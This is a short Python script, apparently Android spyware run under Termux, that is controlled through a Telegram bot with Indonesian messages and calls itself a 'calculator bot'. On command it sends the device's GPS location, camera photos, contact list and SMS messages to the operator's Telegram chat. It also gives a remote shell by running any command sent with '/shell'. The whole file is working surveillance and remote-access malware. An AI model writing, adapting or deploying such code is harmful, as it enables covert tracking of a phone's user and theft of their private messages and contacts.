import telebot
import os
import json

BOT_TOKEN = ''
OWNER_ID =  # Ganti dengan ID Telegram kamu

bot = telebot.TeleBot(BOT_TOKEN)

def only_owner(func):
    def wrapper(message):
        if message.from_user.id == OWNER_ID:
            return func(message)
        else:
            bot.reply_to(message, "❌ Lu bukan pemilik bro!")
    return wrapper

@bot.message_handler(commands=['start'])
@only_owner
def start(message):
    bot.reply_to(message, "🛰️ Bot kalkulator siap mantau...")

@bot.message_handler(commands=['get_location'])
@only_owner
def location(message):
    os.system("termux-location --provider gps --request once > /sdcard/location.json")
    with open("/sdcard/location.json") as f:
        data = json.load(f)
        reply = f"📍 Lokasi:\nLat: {data['latitude']}\nLon: {data['longitude']}"
        bot.reply_to(message, reply)

@bot.message_handler(commands=['snap'])
@only_owner
def snap(message):
    os.system("termux-camera-photo -c 0 /sdcard/snap.jpg")
    with open("/sdcard/snap.jpg", "rb") as photo:
        bot.send_photo(message.chat.id, photo)

@bot.message_handler(commands=['open_whatsapp'])
@only_owner
def open_wp(message):
    os.system("am start -n com.whatsapp/.Main")
    bot.reply_to(message, "✅ WhatsApp dibuka.")

@bot.message_handler(commands=['get_contacts'])
@only_owner
def contacts(message):
    os.system("termux-contact-list > /sdcard/contacts.json")
    with open("/sdcard/contacts.json", "rb") as file:
        bot.send_document(message.chat.id, file)

@bot.message_handler(commands=['get_sms'])
@only_owner
def sms(message):
    os.system("termux-sms-list > /sdcard/sms.json")
    with open("/sdcard/sms.json", "rb") as file:
        bot.send_document(message.chat.id, file)

@bot.message_handler(func=lambda m: m.text.startswith('/shell '))
@only_owner
def shell(message):
    cmd = message.text.replace('/shell ', '')
    try:
        output = os.popen(cmd).read()
        if output:
            bot.reply_to(message, f'📄 Output:\n{output}')
        else:
            bot.reply_to(message, "✅ Perintah dijalankan.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

print("Bot aktif...")
bot.polling()
